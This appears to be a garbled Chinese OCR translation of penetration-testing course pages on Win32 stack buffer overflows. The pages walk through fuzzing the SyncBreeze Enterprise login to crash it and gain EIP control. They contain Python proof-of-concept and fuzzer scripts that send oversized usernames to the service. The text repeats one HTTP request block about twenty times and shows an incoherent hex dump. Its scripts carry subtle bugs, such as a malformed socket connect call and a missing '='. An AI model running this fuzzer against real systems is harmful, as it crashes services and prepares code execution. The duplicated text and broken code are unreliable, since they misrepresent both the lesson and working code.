+www.offensive-security.com
+
+Immunity: 咨询服务管理器
+
+![](img/f99f528ca9845f4c256ce54e882b1345_364_0.png)
+
+# 攻击性安全
+
+## 基于 Kali Linux 的渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_365_0.png)
+
+图 21：从 `main` 返回到父函数
+
+### 10.2.4 缓冲区溢出
+
+在上一个示例中，我们只在可用的 64 字节中写入了 12 字节，程序运行并按预期整洁退出。然而，缓冲区地址 (`0x0065FE70`) 与主函数返回地址之间的偏移量为 76（十六进制为 `0x4c`）字节，因此，如果我们提供 80 个 "A" 作为参数，它们应该被复制到堆栈上，并越过分配的缓冲区边界写入目标返回地址，如图 202 所示。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_365_1.png)
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+# 攻击性安全
+
+www.offensive-security.com
+
+# 复制 12 个 A
+
+# 复制 80 个 A
+
+# StrCpy 之前
+
+| StrCpy 目标地址 | StrCpy 目标地址 | StrCpy 目标地址 |
+|---|---|---|
+| StrCpy 源地址 | StrCpy 源地址 | StrCpy 源地址 |
+| 预留字符缓冲区内存 | AAAAAAAAAAAA | AAAAAAAAAAAA |
+| 预留字符缓冲区内存 | 预留字符缓冲区内存 | AAAAAAAAAAAA |
+| 预留字符缓冲区内存 | 预留字符缓冲区内存 | AAAAAAAAAAAA |
+| 预留字符缓冲区内存 | 预留字符缓冲区内存 | AAAAAAAAAAAA |
+| 父函数的返回地址 | 父函数的返回地址 | AAAA |
+
+图 202：缓冲区溢出的插图
+
+要执行此操作，我们通过 *File > Open* 重新打开应用程序，并参数输入 80 个 A。在 *strcpy* 函数上设置断点并继续执行后，我们得到的栈布局如图 203 所示。
+
+
+
+```
+74657374 0a 74657374,74657374f
+74657374 0a 7375,4547,4547
+74657374 0a 4547,4547,4547
+74657374 0a
+74657374 03
+返回地址至 004016f(strcpy.004016f)
+```
+
+```
+Address      Hex dump                EIP
+0011d0d0 00 00 00 00 27 00 00 00 *00401227*
+0011d0e0 00 00 00 00 ff ff ff ff 
+0011d0f0 00 00 00 00 ff ff ff ff 
+0011d100 00 00 00 00 ff ff ff ff 
+0011d110 27 00 00 00 33 65 31 2a *00401223*
+0011d120 00 00 00 00 ff ff ff ff 
+0011d130 00 00 00 00 ff ff ff ff 
+0011d140 00 00 00 00 ff ff ff ff 
+0011d150 00 00 00 00 ee ee ee ee 
+0011d160 00 00 00 00 ee ee ee ee 
+0011d170 00 00 00 00 ee ee ee ee 
+0011d180 00 00 00 00 ee ee ee ee 
+0011d190 00 00 00 00 ee ee ee ee 
+0011d1a0 00 00 00 00 ee ee ee ee 
+0011d1b0 00 00 00 00 ee ee ee ee 
+0011d1c0 00 00 00 00 ee ee ee ee 
+0011d1d0 00 00 00 00 ee ee ee ee 
+0011d1e0 00 00 00 00 ee ee ee ee 
+0011d1f0 00 00 00 00 ee ee ee ee 
+0011d200 00 00 00 00 ee ee ee ee 
+0011d210 00 00 00 00 ee ee ee ee 
+0011d220 00 00 00 00 ee ee ee ee 
+0011d230 00 00 00 00 ee ee ee ee 
+0011d240 00 00 00 00 ee ee ee ee 
+0011d250 00 00 00 00 ee ee ee ee 
+0011d260 00 00 00 00 ee ee ee ee 
+0011d270 00 00 00 00 ee ee ee ee 
+0011d280 00 00 00 00 ee ee ee ee 
+0011d290 00 00 00 00 ee ee ee ee 
+0011d2a0 00 00 00 00 ee ee ee ee 
+0011d2b0 00 00 00 00 ee ee ee ee 
+0011d2c0 00 00 00 00 ee ee ee ee 
+0011d1d0 00 00 00 00 ee ee ee ee 
+0011d1e0 00 00 00 00 ee ee ee ee 
+0011d1f0 00 00 00 00 ee ee ee ee 
+```
+
+# Sync Breeze Enterprise
+
+启动服务
+
+| 名称 | 描述 | 状态 | 启动类型 | 日志 |
+| --- | --- | --- | --- | --- |
+| Sync Breeze E |  |  | 手动 | Loc |
+| Sync Host_183db | 停止 |  | 自动 (D...) | Loc |
+| System Event |  | 运行 | 自动 | Loc |
+| System Events |  | 运行 | 自动 (T...) | Loc |
+| Task Schedule |  |  | 自动 | Loc |
+| TCP/IP NetBIC |  |  | 手动 (Trig...) | Loc |
+| Telephony |  |  | 手动 | Net |
+| Thermes | 所有任务 |  | 自动 | Loc |
+| Tile data mod | 刷新 |  | 运行 | 手动 | Loc |
+| Time Broker | 属性 |  | 手动 | Loc |
+| Touch Keyboa |  | 运行 | 手动 (Trig...) | Loc |
+| Update Order | 帮助 |  | 手动 | Loc |
+| UPnP Device Fi |  |  |  | Loc |
+| User Data Access_183db | 提供应用... |  | 手动 | Loc |
+
+图 206：SyncBreeze 服务启动
+
+现在服务已经运行，我们可以专注于漏洞发现过程了。如果我们对该漏洞一无所知，我们将开始对该应用程序提供的每个输入字段进行模糊测试（fuzzing），希望出现意外的行为或应用程序崩溃。为了本模块的目的，我们将跳过这一步，专门关注漏洞的用户名字段。为了从零编写一个基于生成的模糊测试器（uzzer），我们首先对在漏洞交换期间客户端和服务器之间传输的网络流量进行采样，将其作为我们的输入数据或种子。
+
+> 我们将在本模块中使用 Wireshark 来收集网络协议信息，但也可以使用像 Burp Suite 这样的网络代理来分析基于 HTTP 的协议。
+
+首先，我们将在 Kali Linux 上启动 Wireshark，使用无效凭据登录 SyncBreeze，并在登录 SyncBreeze 时监控 Windows 10 机器上 TCP 端口 80 的流量。
+
+# Sync Breeze Enterprise 登录
+
+| 用户名: |  |
+| --- | --- |
+| 密码: |  |
+
+图 207：登录 SyncBreeze
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+| 源 | 目的 | 协议 | 长度信息 |
+| --- | --- | --- | --- |
+| 10.11.0.22 | 10.11.0.4 | TCP | 43166 (SYN, ACK) Seq=0 Ack=1 Win=65535 Len=0 |
+| 10.11.0.4 | 10.11.0.22 | TCP | 543166 [ACK] Seq=1 Ack=Win=29312 Len=0 |
+| 10.11.0.4 | 10.11.0.22 | HTTP | 345 GET /index.html HTTP/1.1 Seq=1 Ack=Win=525568 Len=| |
+| 10.11.0.4 | 10.11.0.22 | TCP | 543166 [ACK] Seq=292 Ack=Win=29312 Len= |
+| 10.11.0.4 | 10.11.0.22 | HTTP | 1273 GET /index.html HTTP/1.1 Seq=1 Ack=Win=32128 Len=0 |
+| 10.11.0.4 | 10.11.0.22 | TCP | 543166 [ACK] Seq=292 Ack=Win=525568 Len=| |
+| 10.11.0.22 | 10.11.0.4 | TCP | 60 80 [FIN, ACK] Seq=1237 Ack=Win=525568 Len=| |
+| 10.11.0.22 | 10.11.0.4 | TCP | 543166 [ACK] Seq=1237 Ack=Win=525568 Len=| |
+| 10.11.0.22 | 10.11.0.4 | TCP | 60 80 [ACK] Seq=1238 Ack=Win=550 |
+
+图 208：我们的 HTTP 流量对 HTTP 握手的 Wireshark 采集。
+
+响应流量显示了 TCP 握手，随后是我们的 HTTP 流量。TCP 流如下：
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+| 源 | 目的 | 协议 | 长度信息 |
+| --- | --- | --- | --- |
+| 10.11.0.22 | 10.11.0.4 | TCP | 43166 (SYN, ACK) Seq=0 Ack=1 Win=65535 Len=0 |
+| 10.11.0.4 | 10.11.0.22 | TCP | 543166 [ACK] Seq=1 Ack=Win=29312 Len=0 |
+| 10.11.0.4 | 10.11.0.22 | HTTP | 345 GET /index.html HTTP/1.1 Seq=1 Ack=Win=525568 Len= |
+| 10.11.0.4 | 10.11.0.22 | TCP | 543166 [ACK] Seq=292 Ack=Win=29312 Len= |
+| 10.11.0.4 | 10.11.0.22 | HTTP | 1273 GET /index.html HTTP/1.1 Seq=1 Ack=Win=32128 Len=0 |
+| 10.11.0.4 | 10.11.0.22 | TCP | 543166 [ACK] Seq=292 Ack=Win=525568 Len= |
+
+
+
+| 10.11.0.22 | 10.11.0.4 | TCP | 60 80 [FIN, ACK] Seq=1237 Ack=Win=525568 Len=| | |
+| 10.11.0.22 | 10.11.0.4 | TCP | 543166 [ACK] Seq=1237 Ack=Win=525568 Len=| | |
+| 10.11.0.22 | 10.11.0.4 | TCP | 60 80 [ACK] Seq=1238 Ack=Win=550 |
+
+图 208：我们的 HTTP 流量对 HTTP 握手的 Wireshark 采集。
+
+检查响应流量显示了 TCP 握手，随后是我们的 HTTP 流量。TCP 流如下：
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+```
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+响应流量显示了 TCP 握手，随后是我们的 HTTP 流量。TCP 流如下：
+
+```python
+POST /login HTTP/1.1
+Host: 10.11.0.22
+User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8
+Accept-Language: en-US,q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.11.0.22/login
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=AAAA&password=BBBB 200 OK
+Content-Type: text/html
+Content-Length: 730
+```
+
+341 - HTTP 流量
+
+响应流量显示用户名和密码无效，但由于漏洞发生在身份验证之前，我们可以通过以下类似的概念验证（PoC）脚本来进行通信并开始模糊测试：
+
+
+
+```python
+#!/usr/bin/python
+import socket
+
+try:
+    print("Sending buffer...")
+    size = 100
+    inputBuffer = "A" * size
+    content = "username=" + inputBuffer + "&password=A"
+    buffer = "POST /login HTTP/1.1\r\n"
+    buffer += "Host: 10.11.0.22\r\n"
+    buffer += "User-Agent: Mozilla/5.0 (X11; Linux 1686; rv=52.0) Gecko/20100101 Firefox/52.0\r\n"
+    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*+q=0.8\r\n"
+    buffer += "Accept-Language: en-US,q=0.5\r\n"
+    buffer += "Accept-Encoding: gzip, deflate\r\n"
+    buffer += "Referer: http://10.11.0.22/login\r\n"
+    buffer += "Connection: keep-alive\r\n"
+    buffer += "Upgrade-Insecure-Requests: 1\r\n"
+    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+    buffer += "Content-Length:"+str(len(content))+"\r\n"
+    buffer += "\r\n"
+    buffer += content
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect("10.11.0.22", 80)
+    s.send(buffer)
+    s.close()
+    print("Done!")
+except:
+    print("Could not connect!")
+```
+
+### 342 - 执行 HTTP POST 的 Python 脚本
+
+由于我们处理的是缓冲区溢出漏洞，我们将构建一个基于生成的模糊测试器，使其发送越来越长的用户名。脚本的下一次迭代如343所示：
+
+```python
+#!/usr/bin/python
+import socket
+import time
+import sys
+
+size = 100
+
+while(size < 2000):
+    try:
+        print("Sending evil buffer with %s bytes" % size)
+        inputBuffer = "A" * size
+        content = "username" + inputBuffer + "&password=A"
+        buffer = "POST /login HTTP/1.1\r\n"
+        buffer += "Host: 10.11.0.22\r\n"
+        buffer += "User-Agent: Mozilla/5.0 (X; Linux, x86_64; rv:52.0) Gecko/2010101 Firefox/52.0\r\n"
+        buffer += "Accept: text/html,xhtml+xml,application/xml;q=0.9,*/*\r\n"
+        buffer += "Accept-Language: en-us,q=0.5\r\n"
+        buffer += "Referer: http://10.11.0.22/login\r\n"
+        buffer += "Connection: close\r\n"
+        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += "Content-Length:"+str(len(content))+"r\n"
+        buffer += "\r\n"
+        buffer += content
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect("10.11.0.22", 80)
+        s.send(buffer)
+        s.close()
+        size += 1
+        time.sleep(10)
+    except:
+        print("Could not connect!")
+```
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+## 寄存器 (FPU)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_375_0.png)
+
+图 211：Immunity Debugger 中的访问违规
+
+我们的模糊器（fuzzer）触发应用程序中的一个漏洞！这种漏洞通常由于内存操作（如复制或移动）覆盖了其预设内存区域之外的数据导致。当覆盖发生在栈上时，会导致栈缓冲区溢出。这看起来像是一个相当无不足道的疏忽，但我们成功地欺骗了 `EIP` 执行我们想要的任何代码。
+
+我们导致了作为服务运行的 SyncBreeze 崩溃。由于它崩溃了，我们需要通过服务控制台 `msc` 重新启动它。
+
+| 名称 |get | 状态 | 启动类型 | 登录账户 |
+| --- | --- | --- | --- | --- |
+| SyncBreeze Enterprise | | | 自动 | 本地系统... |
+| System Event Notification S... | 监控系统... | 运行 | 自动 | 本地系统... |
+| System Events Broker | 协调... | 运行 | 自动 (T... | 本地系统... |
+| Task Scheduler | 启用用用... | 运行 | 自动 | 本地系统... |
+| TCP/IP NetBIOS Helper | 提供支持... | 运行 | 手动 (触发... | 本地服务 |
+| Te.Service | | | 手动 | 本地系统... |
+| Telephony | | | 手动 | 网络服务... |
+| Themes | 提供我们... | 运行 | 自动 | 本地系统... |
+
+图 212：services.msc 中的 SyncBreeze 服务
+
+## 11.1.2 练习
+
+- 1. 构建模糊器并复现 SyncBreeze 崩溃。
+- 2. 查看其他寄存器和栈内存的内容。是否有任何内容似乎受到模糊输入的影响？
+
+## 11.2 Win32 缓冲区溢出利用
+
+发现一个可利用的漏洞是非常兴奋的，但将其开发为可行的利用程序并成功获取 shell 更加令人兴奋且具实用价值。为此，我们的第一个目标是获取 `EIP` 寄存器的控制。
+
+## 关于 DEP、ASLR 和 CFG
+
+设计了多种机制来使获取或利用 `EIP` 控制变得更加困难。
+
+微软实现了几种保护措施，特别是数据执行保护 (`DEP`)、地址布局随机化 (`ASLR`) 和控制流防护 (`CFG`)。在继续之前，让我们详细讨论一下这些内容。
+
+`DEP` 是一组硬件和软件技术，通过对内存进行额外检查来帮助防止恶意代码在系统上运行。`DEP` 的主要作用是在尝试从数据页执行代码时抛出异常，从而防止代码执行。
+
+`ASLR` 在每次系统启动时随机化加载的应用程序和 `DLL` 的基地址。在没有实现 `ASLR` 的旧版 Windows XP 上，所有 `DLL` 每次都会加载到相同的内存地址，这使得利用变得简单得多。与 `DEP` 结合时，`ASLR` 为利用提供了非常强大的缓解。
+
